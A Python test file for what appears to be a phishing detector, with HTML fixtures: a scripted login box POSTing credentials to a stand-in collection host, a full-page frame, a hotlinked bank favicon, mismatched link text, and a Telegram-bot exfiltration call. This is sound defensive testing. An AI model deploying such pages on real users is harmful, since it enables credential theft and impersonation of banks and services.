"""Formless script forms, full-page frames, brand assets, displayed vs. actual links, the password's destination."""
from attachment_parser import AttachmentParser
from helpers import run_page, run_file

SCRIPT_FORM = """<html><head><title>Account</title></head><body><div class="box">
<input type="email" id="u" placeholder="Email"><input type="password" id="p"><button onclick="go()">Next</button></div>
<script>function go(){fetch("https://collect.example.top/save",{method:"POST",body:JSON.stringify({u:u.value,p:p.value})})}</script>
</body></html>"""


def test_fields_without_a_form_sent_by_a_script_are_a_form():
    form = next(f for f in AttachmentParser.parse_html(SCRIPT_FORM, base_url="https://acc-check.example.org/")["forms"] if f.get("formless"))
    assert form["has_password"] and form["action_host"] == "collect.example.top" and form["is_external"]
    state = run_page("https://acc-check.example.org/", SCRIPT_FORM)
    assert {"FORM_EXTERNAL_ACTION", "FORM_PASSWORD_HARVESTING"} <= set(state.reason_codes)


def test_full_page_frame_of_another_site():
    html = '<html><body style="margin:0"><iframe src="https://login.evil-host.example/p" width="100%" height="100%"></iframe></body></html>'
    assert "DOM_FULL_PAGE_FRAME" in run_page("https://short-landing.example.net/", html).reason_codes
    small = '<html><body><iframe src="https://www.youtube.com/embed/x" width="560" height="315"></iframe></body></html>'
    assert "DOM_FULL_PAGE_FRAME" not in run_page("https://blog.example.net/", small).reason_codes


def test_brand_icon_hotlinked_from_the_official_domain():
    html = """<html><head><title>Вход</title><link rel="icon" href="https://www.sberbank.ru/favicon.ico"></head>
    <body><form action="/auth.php" method="post"><input name="login"><input type="password" name="p"></form></body></html>"""
    state = run_page("https://secure-auth-online.example.top/", html)
    assert state.brand_evidence.detection_source == "brand_assets"
    assert "BRAND_IMPERSONATION_CONFIRMED" in state.reason_codes
    assert "sberbank.ru" in state.reason_evidence["BRAND_IMPERSONATION_CONFIRMED"]["value"]


def test_displayed_address_differs_from_the_link_on_a_page():
    html = '<html><body><p>Open <a href="https://pay-verify.example.top/x">https://www.gosuslugi.ru/pay</a></p></body></html>'
    assert "DOM_LINK_TEXT_MISMATCH" in run_page("https://news.example.org/", html).reason_codes


def test_ip_lookup_is_not_the_password_destination():
    html = """<html><body><form><input type="email" name="e"><input type="password" name="p"></form><script>
    fetch("https://api.ipify.org?format=json");
    fetch("https://api.telegram.org/bot123456789:AAEhBOweik6ad9r_QXMENQjcrGbqCr4K-ab/sendMessage",{method:"POST"});
    </script></body></html>"""
    state = run_file("Instagram_login.html", html.encode())
    assert "RC_ATTACH_TELEGRAM_EXFIL" in state.reason_codes
    detail = state.reason_details.get("FORM_PASSWORD_HARVESTING")
    assert detail is None or ("telegram" in detail.lower() and "ipify" not in detail)
    assert "ipify" not in (state.generated_yara_rule or "")
